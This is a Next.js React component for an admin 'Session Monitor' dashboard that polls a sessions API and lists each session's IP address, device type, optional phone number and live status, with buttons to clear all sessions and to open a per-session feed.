'use client';

import { useEffect, useState } from 'react';
import Link from 'next/link';

interface Session {
    _id: string;
    ipAddress: string;
    userAgent: string;
    deviceInfo: string;
    phoneNumber?: string;
    isActive: boolean;
    lastSeen: string;
    createdAt: string;
}

export default function AdminDashboard() {
    const [sessions, setSessions] = useState<Session[]>([]);

    useEffect(() => {
        fetchSessions();
        const interval = setInterval(fetchSessions, 5000);
        return () => clearInterval(interval);
    }, []);

    const fetchSessions = async () => {
        try {
            const res = await fetch('/api/sessions');
            const data = await res.json();
            if (data.success) {
                setSessions(data.sessions);
            }
        } catch (err) {
            console.error(err);
        }
    };

    const isLive = (lastSeen: string) => {
        const diff = new Date().getTime() - new Date(lastSeen).getTime();
        return diff < 60000; // < 1 minute
    };

    const handleClearSessions = async () => {
        if (!confirm('Are you sure you want to clear all sessions?')) return;
        try {
            const res = await fetch('/api/sessions', { method: 'DELETE' });
            const data = await res.json();
            if (data.success) {
                setSessions([]);
                alert('All sessions cleared');
            }
        } catch (err) {
            console.error(err);
            alert('Failed to clear sessions');
        }
    };

    return (
        <div className="min-h-screen bg-slate-900 text-slate-100 p-8 font-sans">
            <header className="flex justify-between items-center mb-8 border-b border-slate-700 pb-4">
                <div className="flex items-center gap-4">
                    <h1 className="text-2xl font-bold">Session Monitor</h1>
                    <span className="bg-blue-600 text-white px-3 py-1 rounded-full text-sm font-bold">
                        {sessions.length} Active
                    </span>
                </div>
                <div className="flex gap-3">
                    <button 
                        onClick={fetchSessions}
                        className="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded font-bold transition flex items-center gap-2"
                    >
                        🔄 Refresh
                    </button>
                    <button 
                        onClick={handleClearSessions}
                        className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded font-bold transition flex items-center gap-2"
                    >
                        🗑️ Clear All
                    </button>
                </div>
            </header>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {sessions.map(session => (
                    <div key={session._id} className="bg-slate-800 rounded-xl p-6 border border-slate-700 hover:border-blue-500 transition shadow-lg relative overflow-hidden group">
                        <div className="flex justify-between items-start mb-4">
                            <div className="bg-slate-700 w-12 h-12 rounded flex items-center justify-center text-2xl">
                                {session.deviceInfo.includes('Mobile') ? '📱' : '💻'}
                            </div>
                            {isLive(session.lastSeen) ? (
                                <div className="text-xs font-bold uppercase text-slate-400 flex items-center gap-2">
                                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div> Live Now
                                </div>
                            ) : (
                                <div className="text-xs font-bold uppercase text-slate-400">Offline</div>
                            )}
                        </div>
                        
                        <div className="font-mono text-lg font-bold mb-1">{session.ipAddress}</div>
                        <div className="text-slate-400 text-sm mb-4 space-y-1">
                            <div>ID: #{session._id.slice(-6)}</div>
                            {session.phoneNumber && (
                                <div className="text-green-400">📞 {session.phoneNumber}</div>
                            )}
                            <div className="text-xs opacity-70">Started: {new Date(session.createdAt).toLocaleTimeString()}</div>
                        </div>

                        <div className="pt-4 border-t border-slate-700">
                            <Link 
                                href={`/admin/view/${session._id}`}
                                className="block w-full text-center bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded transition"
                            >
                                Connect to Feed
                            </Link>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}
